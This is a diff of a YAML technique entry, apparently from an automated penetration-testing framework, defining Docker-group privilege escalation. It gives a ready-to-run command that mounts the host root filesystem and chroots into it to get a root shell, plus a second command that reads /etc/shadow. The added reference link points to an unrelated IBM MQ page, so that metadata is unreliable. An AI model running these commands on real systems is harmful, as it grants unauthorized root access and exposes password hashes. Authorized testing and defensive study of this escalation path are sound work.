@@ -2,14 +2,17 @@ name: docker_privesc
 category: privesc
 description: Docker group membership privilege escalation
 preconditions:
-  - os==linux
+- os==linux
 parameters: {}
-command_template: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
+command_template: docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 parser: null
 expected_effects:
-  - root_shell_obtained
+- root_shell_obtained
 falsifier:
-  pattern: "permission denied|Cannot connect"
+  pattern: permission denied|Cannot connect
   timeout: 30
 model_tier: haiku
-mechanism: "Docker group = root equivalent. Mount host root filesystem into container, chroot into it. Also works with: docker run -v /etc/shadow:/tmp/shadow alpine cat /tmp/shadow. LXD group has similar escalation path."
+mechanism: 'Docker group = root equivalent. Mount host root filesystem into container,
+  chroot into it. Also works with: docker run -v /etc/shadow:/tmp/shadow alpine cat
+  /tmp/shadow. LXD group has similar escalation path.'
+hacktricks_ref: network-services-pentesting/1414-pentesting-ibmmq.md
